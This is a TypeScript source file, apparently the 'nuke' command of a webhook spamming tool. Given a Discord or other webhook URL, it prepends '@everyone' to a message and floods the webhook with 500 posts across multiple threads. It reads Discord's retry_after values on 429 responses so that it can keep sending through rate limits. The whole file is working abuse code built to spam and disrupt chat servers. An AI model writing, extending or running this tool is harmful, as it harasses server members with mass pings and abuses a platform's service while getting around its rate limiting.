import type { Args } from '../types/args.js';
import { send } from '../core/req.js';
import { buildPayload } from '../core/hook.js';
import { Queue } from '../core/queue.js';
import { readJson } from '../utils/file.js';
import { sleep } from '../utils/time.js';
import { info, success, error } from '../utils/log.js';
import { isWebhookUrl } from '../core/valid.js';
import { exitError } from '../utils/exit.js';
import { getMessage, getDelay, getThreads, getTimeout } from '../utils/cfg.js';

export const handleNuke = async (args: Args): Promise<void> => {
  if (!isWebhookUrl(args.url)) {
    exitError('Invalid webhook URL');
  }

  const defaultMsg = await getMessage('nuke');
  let msg = args.msg || defaultMsg;

  if (args.url.includes('discord.com')) {
    msg = `@everyone ${msg}`;
  }

  let payload = buildPayload(msg);

  if (args.json) {
    try {
      const custom = await readJson(args.json);
      payload = buildPayload(msg, custom);
    } catch (err) {
      exitError(`Failed to load JSON: ${err instanceof Error ? err.message : String(err)}`);
    }
  }

  const threads = args.threads === 0 ? await getThreads() : args.threads;
  const queue = new Queue(threads);
  const target = 500;
  let sent = 0;
  let failed = 0;
  const startTime = Date.now();

  info(`Nuking ${args.url} with ${threads} threads...`);

  const timeout = args.timeout === 0 ? await getTimeout() : args.timeout;
  const sendRequest = async (): Promise<boolean> => {
    try {
      const res = await send(args.url, payload, timeout);
      if (res.ok) {
        return true;
      } else {
        if (res.status === 429) {
          const retryAfter = res.text.includes('retry_after') ? 
            parseFloat(JSON.parse(res.text).retry_after) * 1000 : 1000;
          await sleep(retryAfter);
        }
        return false;
      }
    } catch (err) {
      return false;
    }
  };

  const delay = args.delay === 0 ? await getDelay() : args.delay;
  
  while (sent < target) {
    const remaining = target - sent;
    const batch = Math.min(remaining, 100);
    
    const tasks: Array<Promise<boolean>> = [];
    for (let i = 0; i < batch; i++) {
      tasks.push(queue.add(sendRequest));
      if (delay > 0) await sleep(delay);
    }

    const results = await Promise.all(tasks);
    const batchSent = results.filter(r => r).length;
    const batchFailed = results.filter(r => !r).length;
    
    sent += batchSent;
    failed += batchFailed;
    
    process.stdout.write(`\rSent: ${sent} Failed: ${failed} Remaining: ${target - sent}`);
    
    if (batchFailed > 0) {
      await sleep(1000);
    }
  }

  const elapsed = Date.now() - startTime;
  console.log();
  success(`Completed in ${(elapsed / 1000).toFixed(2)}s`);
  success(`Sent: ${sent} Failed: ${failed}`);
};
